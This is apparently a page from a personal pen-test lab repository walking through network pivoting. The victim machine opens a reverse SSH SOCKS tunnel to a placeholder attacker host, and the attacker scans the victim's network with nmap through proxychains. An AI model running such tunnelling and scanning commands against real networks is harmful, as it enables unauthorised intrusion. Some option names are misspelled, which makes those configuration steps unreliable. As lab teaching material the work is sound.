## Configure a Port Fowarding Rule

![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/6f884824-3493-45c3-b352-12c24a82e1e3)

![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/a007e4fa-4897-4dfe-8e8a-dbd967682037)




#### ***SKIP NEXT STEP IF YOU CONFIGURED PROXY CHAINS ALREADY***

1.(COMMENT) `(#strictchain)`
2.(UNCOMMENT) `(dynamicchain)`
3.(UNCOMMENT) `(quitemode)`
4.(COMMENT) `(#proxydns)`
Then change the default config at the bottom from socks4 to socks5
127.0.0.1 9080 and whatever port you want to use.



### (ATTACKER) 

```
sudo nano /etc/proxychains4.conf
```

#### START HERE IF PROXY CHAINS IS ALREADY CONFIGURED
### (ATTACKER) 

```
netstat -napt (set up listener over ssh)
```

```
sudo systemctl status ssh.service (CHECK CHANGE CHECK)
```

```
sudo systemctl start ssh.service (check if started)
```

```
netstat -napt | grep LISTEN
```

Example of open port

![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/2e8d4981-4e7f-4885-bdd1-3a068f50d35f)


### (VICTIM)

```
ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port
```

(This command wont show you anything go back to kali and run net stat, port shoud be open now) 
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/f908fd65-c196-4d2c-918e-9cc18a4e7cc8)

(since the proxy is now available to us we will wrap nmap inside proxychains)
### (ATTACKER) 

```
sudo proxychains nmap -iL scope -F -sT -Pn | tee fast_scan
```

(we are listening over ssh we are not manipulating the port we are manipulating the port fowarding rule)

